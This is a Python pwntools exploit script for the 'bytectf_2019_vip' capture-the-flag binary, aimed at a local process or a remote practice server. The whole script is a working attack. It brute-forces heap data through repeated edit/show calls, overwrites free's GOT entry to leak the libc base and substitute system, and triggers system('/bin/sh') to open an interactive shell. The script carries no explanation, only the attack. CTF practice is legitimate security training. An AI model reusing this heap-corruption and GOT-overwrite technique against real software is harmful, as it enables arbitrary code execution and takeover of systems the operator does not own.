#coding:utf-8
import sys
from pwn import *
# context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./bytectf_2019_vip')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./bytectf_2019_vip')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',26088)
			elf=ELF('./bytectf_2019_vip')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a):
			io.sendlineafter('Your choice: ','1')
			io.sendlineafter('Index: ',str(a))

		def edit(a,b,c=''):
			io.sendlineafter('Your choice: ','4')
			io.sendlineafter('Index: ',str(a))
			io.sendlineafter('Size: ',str(b))
			io.sendafter('Content: ',c)

		def show(a):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Index: ',str(a))

		def delete(a):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Index:',str(a))

		add(0)
		add(1)
		delete(1)
		while  True:
			edit(0,0x63)
			show(0)
			data = io.recvuntil('\nDone!',drop=True) 
			#print(hex(len(data)))
			if len(data) != 0x63:
				continue
			data = u32(data[-4:])
			success("data = %s"%hex(data))
			if (data >> 24) == 0x40:
				break


		while  True:
			edit(0,0x62)
			show(0)
			data = io.recvuntil('\nDone!',drop=True)
			#print(hex(len(data)))
			if len(data) != 0x63:
				continue
			data = u32(data[-4:])
			success("data = %s"%hex(data))
			if (data >> 16) == 0x4040:
				break

		while  True:
			edit(0,0x61)
			show(0)
			data = io.recvuntil('\nDone!',drop=True)
			#print(hex(len(data)))
			if len(data) != 0x63:
				continue
			data = u32(data[-4:])
			success("data = %s"%hex(data))
			if (data >> 8) == 0x4040e0:
				break

		add(1)
		add(2)
		edit(2,1)
		edit(2,0x40,'a'*8+p64(0)*3+p64(elf.got['free']))
		show(0)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['free']
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		edit(0,0x40,p64(system_addr))
		add(1)
		edit(1,8,'/bin/sh\x00')
		delete(1)





		# success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue
